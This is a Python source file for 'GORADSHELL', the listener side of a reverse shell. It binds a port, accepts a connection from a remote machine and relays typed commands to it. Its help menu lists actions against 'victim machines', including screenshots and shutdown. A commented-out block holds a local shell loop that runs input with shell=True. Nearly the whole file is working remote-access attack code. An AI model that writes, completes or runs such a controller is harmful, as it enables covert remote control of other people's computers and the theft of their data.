import os
import time
import subprocess
import platform
import socket
from PIL import ImageGrab
from colorama import Fore, Style
import pyfiglet

"""
output_file = "test.png"
screenshot = ImageGrab.grab()
screenshot.save(output_file)
print(f"Capture d'écran enregistrée sous {output_file}")
"""

#=====HOST INFO====#
HOST = ""# Toutes les hôtes sont autorisé
#PORT = 12345 # STATIC PORT
#==================#

DATA_SIZE = 10000

x = platform.system()

#========================ART====================#
my_art = pyfiglet.figlet_format("GORADSHELL!", font="slant")
def pentester_effect(text):
    for i in text.splitlines():
        print(Fore.GREEN + i + Style.RESET_ALL)  # Texte en vert
        time.sleep(0.1)  # Pause pour l'effet progressif

os.system("cls" if os.name == "nt" else "clear")

pentester_effect(my_art)
#===================ART_END=====================#


PORT = int(input("PORT TO LISTEN #"))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen()


print("[*] waiting connection ... ")
print("[Port]:" + str(PORT))


client_socket,client_address =s.accept()


# Affichage avec couleur
print(f"{Fore.YELLOW}[*] New Client Connected Found ... {Style.RESET_ALL}")

print(f"[+] Client ip: {client_address}")



client_info = client_socket.recv(DATA_SIZE)#Recevoir les reponses aux clients


def get_prompt():#function to get prompt
    global client_info
    info = client_info.decode()#decode le resultat
    try:
        commande = "info"
        client_socket.sendall(commande.encode())#Send command
        output = client_socket.recv(DATA_SIZE)
        return output.decode()
    except:
        commande = input(info + '>')
        client_socket.sendall(commande.encode())


while True:
    
    info = client_info.decode()#decode le resultat
    try:
        prompt = get_prompt()
        commande = input( prompt + '#')
        if commande == "exit":
            exit()#quitter
            break
        elif commande == "":
            continue#pas de commande


        if commande == "screenshot":
            print("screenshoot")

        if commande == "help":
            print("")
            print("")
            print("====================")
            print("  BASIC COMMAND  ")
            print("====================")
            print("ls /dir          -- Show directory or file  ")
            print("mkdir            -- Create Directory")
            print("rmdir            -- Delete Directory")
            print("Touch            -- Create File (On Linux) ")
            print("")
            print("")
            print("")
            print("")
            print("====================")
            print("  COMMANDS TOOLS  ")
            print("====================")
            print("shutdown         -- Stop the current system")
            print("screenshot       -- Take Screenshot of victim machines")
            print("ip               -- Show Network Info (Windows Only ) Tip manually for Linux")
            print("")
            print("")            

        client_socket.sendall(commande.encode())#Send command

        output = client_socket.recv(DATA_SIZE)
        print(f' {output.decode()}')#Sortie de commande
    except:
        commande = input(info + '>')
        client_socket.sendall(commande.encode())

s.close()
client_socket.close()








"""

print("GORADSHELL#>" )
while True:
    commande = input("in_Shell> " + os.getcwd() + ">")
    if commande == "exit":
        print("Bye Bye...")
        exit()
    if commande == "info":
        print(x)
    if commande == "help":
        print("""""")


    commande_split = commande.split ()
    if len(commande_split) == 2 and commande_split[0] == "cd":
        try:
            os.chdir(commande_split[1])
        except:
            print("ERROR: Try again")
            commande = input(os.getcwd() + ">")

    resultat = subprocess.run(commande , shell = True, capture_output = True, universal_newlines = True)
    print(resultat.stdout)

    """